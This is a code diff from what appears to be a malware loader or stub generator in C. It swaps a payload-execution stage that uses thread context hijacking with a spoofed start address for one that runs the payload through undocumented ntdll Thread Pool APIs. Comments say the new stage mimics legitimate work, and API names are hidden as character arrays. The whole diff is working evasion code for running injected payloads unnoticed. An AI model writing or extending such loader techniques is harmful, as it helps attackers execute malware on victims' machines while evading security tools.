@@ -811,58 +811,23 @@ const char *g_StubTemplate =
     "return 1; }\n"
     "\n"
     // -------------------------------------------------------------------------
-    // [STAGE 5] Execution via Thread Context Hijacking
-    // Creates a suspended thread with a spoofed start address (a benign API),
-    // hijacks its context to point to the payload, and resumes execution.
+    // [STAGE 5] Execution
+    // Use Thread Pool APIs to execute the payload. This mimics legitimate work
+    // items.
     // -------------------------------------------------------------------------
-    "    printf(\"[+] Preparing Thread Start Address Spoofing...\\n\");\n"
-
-    // 1. Resolve a benign API to use as the fake start address (e.g., Sleep)
-    "    char sKernel32[] = "
-    "{'k','e','r','n','e','l','3','2','.','d','l','l',0};\n"
-    "    char sSleep[] = {'S','l','e','e','p',0};\n"
-    "    PVOID pBenignAddress = GetProcAddress(GetModuleHandleA(sKernel32), "
-    "sSleep);\n"
-    "    if (!pBenignAddress) { printf(\"[!] Failed to resolve benign "
-    "address.\\n\"); return 1; }\n"
-
-    "    printf(\"[+] Creating suspended thread with spoofed start address: "
-    "%p\\n\", pBenignAddress);\n"
-
-    // 2. Create the thread in a suspended state pointing to the benign address
-    "    HANDLE hThread = CreateThread(NULL, 0, "
-    "(LPTHREAD_START_ROUTINE)pBenignAddress, NULL, CREATE_SUSPENDED, NULL);\n"
-    "    if (!hThread) { printf(\"[!] CreateThread Failed.\\n\"); return 1; }\n"
-
-    "    printf(\"[+] Hijacking thread context to point to payload at: "
-    "%p\\n\", pAddr);\n"
-
-    // 3. Retrieve the current execution context of the suspended thread
-    "    CONTEXT ctx;\n"
-    "    ctx.ContextFlags = CONTEXT_FULL;\n"
-    "    if (!GetThreadContext(hThread, &ctx)) {\n"
-    "        printf(\"[!] GetThreadContext Failed.\\n\");\n"
-    "        TerminateThread(hThread, 0);\n"
-    "        return 1;\n"
-    "    }\n"
-
-    // 4. Modify the Instruction Pointer (RIP) to point to the stomped module
-    // (the payload)
-    "    ctx.Rip = (DWORD64)pAddr;\n"
-
-    // 5. Apply the modified context back to the thread
-    "    if (!SetThreadContext(hThread, &ctx)) {\n"
-    "        printf(\"[!] SetThreadContext Failed.\\n\");\n"
-    "        TerminateThread(hThread, 0);\n"
-    "        return 1;\n"
-    "    }\n"
-
-    "    printf(\"[+] Resuming thread. Execution starts now...\\n\");\n"
-
-    // 6. Resume the thread. It will now execute the payload, but the OS thinks
-    // it's running Sleep
-    "    ResumeThread(hThread);\n"
-    "    WaitForSingleObject(hThread, INFINITE);\n"
+    "    printf(\"[+] Execution handed over to Thread Pool.\\n\");\n"
+    "    char sNt[] = {'n','t','d','l','l','.','d','l','l',0};\n"
+    "    HMODULE hNt = GetModuleHandleA(sNt);\n"
+    "    fnTpAllocWork TpAlloc = (fnTpAllocWork)GetProcAddress(hNt, "
+    "\"TpAllocWork\");\n"
+    "    fnTpPostWork TpPost = (fnTpPostWork)GetProcAddress(hNt, "
+    "\"TpPostWork\");\n"
+    "    PVOID pWork = NULL;\n"
+    "    TpAlloc(&pWork, pAddr, NULL, NULL);\n"
+    "    TpPost(pWork);\n"
+    "    ((fnTpWaitForWork)GetProcAddress(hNt, \"TpWaitForWork\"))(pWork, "
+    "FALSE);\n"
+    "    ((fnTpReleaseWork)GetProcAddress(hNt, \"TpReleaseWork\"))(pWork);\n"
     "\n"
     "    printf(\"[+] Finished. Press Enter to exit.\\n\");\n"
     // "    getchar();\n"
@@ -974,4 +939,5 @@ int main() {
     printf("\n[!] FAILURE: Compilation error.\n");
     return EXIT_FAILURE;
   }
+
 }
